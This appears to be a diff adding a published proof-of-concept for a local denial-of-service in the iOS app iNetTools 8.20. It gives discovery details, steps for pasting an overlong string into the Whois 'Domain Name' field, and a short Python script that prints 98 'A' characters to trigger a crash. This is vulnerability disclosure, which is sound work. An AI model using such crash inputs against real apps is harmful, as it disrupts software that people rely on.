@@ -1,0 +1,25 @@
+# Exploit Title: iNetTools for iOS 8.20 - 'Whois' Denial of Service (PoC)
+# Discovery by: Ivan Marmolejo
+# Discovery Date: 2019-11-25
+# Vendor Homepage: https://apps.apple.com/mx/app/inettools-ping-dns-port-scan/id561659975
+# Software Link: App Store for iOS devices
+# Tested Version: 8.20
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: iPhone 6s iOS 13.2
+
+# Summary: iNetTools is a suite of network diagnose tools on iPhone and iPad. It provides essential tools such as 
+# Ping, DNS Lookup, Trace Route, Port Scan, Whois, Server Monitor, and Lan Scan.
+# Steps to Produce the Crash:
+
+# 1.- Run python code: iNetTools.py
+# 2.- Copy content to clipboard
+# 3.- Open "iNetTools for iOS"
+# 4.- Go to "Whois"
+# 5.- Paste ClipBoard on "Domain Name"
+# 6.- Start
+# 7.- Crashed
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 98
+print (buffer)
